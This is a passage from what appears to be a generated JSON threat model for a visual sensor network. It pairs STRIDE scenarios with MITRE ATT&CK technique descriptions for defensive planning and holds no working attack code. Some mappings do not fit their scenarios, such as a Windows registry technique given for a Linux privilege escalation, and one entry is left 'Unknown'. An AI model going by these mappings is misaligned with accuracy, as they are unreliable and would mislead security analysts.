                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor generates authentication tokens or credentials to gain unauthorized access to the VSN management interface.",
            "Assumptions": [
                {
                    "Assumption": "The management interface is exposed to the internet.",
                    "Role": "Application",
                    "Condition": "Application interface is internet-facing."
                },
                {
                    "Assumption": "Weak or easily guessable passwords are used.",
                    "Role": "User",
                    "Condition": "Users set weak passwords."
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) is enforced.",
                    "Role": "Application",
                    "Condition": "Application does not mandate MFA."
                }
            ],
            "Potential Impact": "Potential access to sensitive configuration settings, leading to unauthorized changes and data exposure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential compromise",
                "unauthorized access",
                "management interface"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates the firmware of the camera nodes to alter the captured visual data.",
            "Assumptions": [
                {
                    "Assumption": "Firmware is not verified or signed before updates.",
                    "Role": "Application",
                    "Condition": "Application does not enforce firmware signing."
                },
                {
                    "Assumption": "The attacker has access to the update distribution mechanism.",
                    "Role": "Attacker",
                    "Condition": "Attacker can intercept update distribution."
                },
                {
                    "Assumption": "Nodes do not have tamper-resistant hardware.",
                    "Role": "Application",
                    "Condition": "Nodes lack tamper-resistant features."
                }
            ],
            "Potential Impact": "Data integrity is compromised, resulting in altered visual data being processed and transmitted.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware manipulation",
                "data alteration",
                "hardware integrity"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary injects malicious code into the application software running on the VSN nodes using an existing vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "The application software has known vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Application contains unpatched vulnerabilities."
                },
                {
                    "Assumption": "No strong code signing or integrity verification mechanisms are in use.",
                    "Role": "Application",
                    "Condition": "Application lacks code integrity checks."
                },
                {
                    "Assumption": "The attacker can exploit the vulnerability remotely.",
                    "Role": "Attacker",
                    "Condition": "Attacker can reach the node's software stack."
                }
            ],
            "Potential Impact": "Introduction of malicious functionality, leading to potential data corruption, espionage, or further compromise.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "malicious code",
                "remote exploitation"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration files of the VSN nodes to change operational parameters.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are stored in an accessible and unprotected location.",
                    "Role": "Application",
                    "Condition": "Application stores unprotected configuration files."
                },
                {
                    "Assumption": "An attacker can obtain access to the file system.",
                    "Role": "Attacker",
                    "Condition": "Attacker gains file system access through vulnerabilities or other means."
                },
                {
                    "Assumption": "Configuration file changes are not logged or monitored.",
                    "Role": "Application",
                    "Condition": "System lacks proper logging and monitoring for configuration changes."
                }
            ],
            "Potential Impact": "Data integrity is affected due to unauthorized changes, possibly leading to system malfunctions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration modification",
                "system parameters",
                "file system access"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions in the VSN, such as disabling certain cameras, and denies performing these actions.",
            "Assumptions": [
                {
                    "Assumption": "Actions performed by nodes or users are not logged.",
                    "Role": "Application",
                    "Condition": "Application lacks detailed logging mechanisms."
                },
                {
                    "Assumption": "Logs that do exist can be easily altered or deleted.",
                    "Role": "Attacker",
                    "Condition": "Log protection is weak or non-existent."
                },
                {
                    "Assumption": "No non-repudiation mechanisms are in place.",
                    "Role": "Application",
                    "Condition": "Application does not enforce non-repudiation measures."
                }
            ],
            "Potential Impact": "Difficulty in forensic analysis and attribution of actions, leading to challenges in incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "action denial",
                "log alteration",
                "incident response"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user manipulates data or executes actions and later claims that their account was compromised.",
            "Assumptions": [
                {
                    "Assumption": "User actions are not adequately tracked or tied to specific individuals.",
                    "Role": "Application",
                    "Condition": "Application lacks action tracking."
                },
                {
                    "Assumption": "No regular audits or reviews of user activities.",
                    "Role": "Application",
                    "Condition": "Application does not regularly review user actions."
                },
                {
                    "Assumption": "Insufficient authentication and authorization mechanisms.",
                    "Role": "Application",
                    "Condition": "Weak authentication/authorization protocols are in place."
                }
            ],
            "Potential Impact": "Challenges in holding users accountable, causing issues in investigations and remediation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user action manipulation",
                "accountability",
                "activity tracking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An external attacker uses an exploited vulnerability to execute actions within the VSN, making it appear as if those actions were performed by a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The application contains exploitable vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Unpatched vulnerabilities exist in the application."
                },
                {
                    "Assumption": "Logs do not differentiate between legitimate user actions and those performed using exploited flaws.",
                    "Role": "Application",
                    "Condition": "Logs lack detailed contextual information."
                },
                {
                    "Assumption": "User activity on the system is not continuously monitored.",
                    "Role": "Application",
                    "Condition": "Application lacks continuous user activity monitoring."
                }
            ],
            "Potential Impact": "Misattribution of malicious activities to legitimate users, leading to erroneous conclusions and actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "exploit",
                "false attribution",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data intercepted via network sniffing due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Application",
                    "Condition": "Network communication does not use encryption."
                },
                {
                    "Assumption": "The attacker can access the same network as VSN nodes.",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access."
                },
                {
                    "Assumption": "Network monitoring mechanisms to detect sniffing activities are absent.",
                    "Role": "Application",
                    "Condition": "No network monitoring is implemented."
                }
            ],
            "Potential Impact": "Disclosure of sensitive visual data, leading to privacy breaches and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network sniffing",
                "unencrypted traffic",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Visual data exposed due to misconfigured access control policies on storage systems.",
            "Assumptions": [
                {
                    "Assumption": "Access control policies are not properly configured or enforced.",
                    "Role": "Application",
                    "Condition": "Misconfigurations in access controls exist."
                },
                {
                    "Assumption": "Storage systems contain sensitive data without proper protection.",
                    "Role": "Application",
                    "Condition": "Sensitive data is unprotected in storage."
                },
                {
                    "Assumption": "Regular audits of access control settings are not conducted.",
                    "Role": "Application",
                    "Condition": "No routine audits are performed on access controls."
                }
            ],
            "Potential Impact": "Unauthorized access to stored visual data, resulting in potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "misconfiguration",
                "access control",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A vulnerability in the application software allows an attacker to gain access to the visual data without authentication.",
            "Assumptions": [
                {
                    "Assumption": "The application has unpatched vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Application is not up-to-date with security patches."
                },
                {
                    "Assumption": "Access control mechanisms do not enforce strict authentication checks.",
                    "Role": "Application",
                    "Condition": "Weak or no authentication is required for data access."
                },
                {
                    "Assumption": "Sensitive data is directly accessible once the vulnerability is exploited.",
                    "Role": "Application",
                    "Condition": "Exploited vulnerability provides direct data access."
                }
            ],
            "Potential Impact": "Exposure of sensitive visual data to unauthorized individuals, leading to privacy violations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerability exploitation",
                "unauthorized access",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack targeting the VSN servers, rendering the system inoperable.",
            "Assumptions": [
                {
                    "Assumption": "The VSN servers can be reached from the internet.",
                    "Role": "Application",
                    "Condition": "Application is exposed to the internet."
                },
                {
                    "Assumption": "No adequate DDoS protection mechanisms are in place.",
                    "Role": "Application",
                    "Condition": "Application lacks DDoS mitigation controls."
                },
                {
                    "Assumption": "The attacker can mobilize significant resources to overwhelm the servers.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to substantial resources (e.g., botnet)."
                }
            ],
            "Potential Impact": "Disruption of system availability and inability to capture/process visual data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "server overload",
                "system inoperability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting a known vulnerability in Linux such as out-of-bounds write to crash the VSN application.",
            "Assumptions": [
                {
                    "Assumption": "Application uses vulnerable versions of underlying software.",
                    "Role": "Application",
                    "Condition": "Application contains unpatched vulnerabilities in the OS."
                },
                {
                    "Assumption": "The attacker can interact with the application to trigger the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Attacker can send crafted inputs to exploit the vulnerability."
                },
                {
                    "Assumption": "The system does not have safeguards like input validation in place.",
                    "Role": "Application",
                    "Condition": "System lacks protective measures to validate inputs."
                }
            ],
            "Potential Impact": "Complete crash of the application, leading to a temporary or extended loss of service.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "application crash",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the VSN with excessive visual data submissions, exhausting storage and bandwidth capacity.",
            "Assumptions": [
                {
                    "Assumption": "There are no rate-limiting measures to throttle excessive data submissions.",
                    "Role": "Application",
                    "Condition": "Application lacks rate-limiting controls."
                },
                {
                    "Assumption": "The network and storage infrastructure cannot handle excessive loads.",
                    "Role": "Application",
                    "Condition": "Infrastructure is not scaled for high loads."
                },
                {
                    "Assumption": "The attacker is capable of submitting large volumes of data.",
                    "Role": "Attacker",
                    "Condition": "Attacker has sufficient bandwidth and capability to flood submissions."
                }
            ],
            "Potential Impact": "Depletion of resources leading to loss of data availability and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data flooding",
                "resource exhaustion",
                "storage bandwidth"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability in the underlying Linux OS to gain higher-level access within the VSN nodes.",
            "Assumptions": [
                {
                    "Assumption": "The application or OS includes unpatched privilege escalation vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Unpatched privilege escalation vulnerabilities are present."
                },
                {
                    "Assumption": "The attacker can access the system to exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Attacker has initial access to the system."
                },
                {
                    "Assumption": "The system lacks monitoring for privilege escalation activities.",
                    "Role": "Application",
                    "Condition": "System is not monitoring for privilege anomalies."
                }
            ],
            "Potential Impact": "Unrestricted access to sensitive data and full control over system operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "OS vulnerabilities",
                "system control"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Using compromised credentials to elevate privileges within the system, gaining administrative access.",
            "Assumptions": [
                {
